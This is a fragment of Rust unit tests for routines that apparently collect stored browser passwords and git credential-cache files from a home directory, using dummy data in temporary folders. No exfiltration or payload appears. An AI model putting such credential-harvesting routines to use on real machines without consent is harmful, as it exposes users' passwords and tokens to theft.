fn collect_browser_passwords_skips_when_no_browsers() {
    use tempfile::TempDir;

    let home = TempDir::new().expect("tmpdir");
    let mut entries = Vec::new();
    collect_browser_passwords(home.path(), &mut entries);
    assert!(entries.is_empty());
}

// ── collect_git_credential_cache ──────────────────────────────────────

#[test]
fn collect_git_credential_cache_harvests_files() {
    use std::fs;
    use tempfile::TempDir;

    let tmp = TempDir::new().expect("tmpdir");
    let cred_file = tmp.path().join("credential");
    fs::write(&cred_file, b"protocol=https\nhost=github.com\nusername=u\npassword=p\n")
        .expect("write");

    let mut entries = Vec::new();
    collect_git_credential_cache_from(tmp.path(), &mut entries);

    assert_eq!(entries.len(), 1);
    assert_eq!(entries[0].kind, "credentials");
    assert!(entries[0].data.starts_with(b"protocol=https"));
}

#[test]
fn collect_git_credential_cache_skips_empty_and_dirs() {
    use std::fs;
    use tempfile::TempDir;

    let tmp = TempDir::new().expect("tmpdir");
    // empty file — should be skipped
    fs::write(tmp.path().join("empty"), b"").expect("write");
    // subdirectory — should be skipped
    fs::create_dir(tmp.path().join("subdir")).expect("mkdir");

    let mut entries = Vec::new();
    collect_git_credential_cache_from(tmp.path(), &mut entries);

    assert!(entries.is_empty());
}

#[test]
fn collect_git_credential_cache_missing_dir_is_noop() {
    let mut entries = Vec::new();
    collect_git_credential_cache_from(
        Path::new("/nonexistent/path/git-credential-cache"),
        &mut entries,
    );
    assert!(entries.is_empty());
}
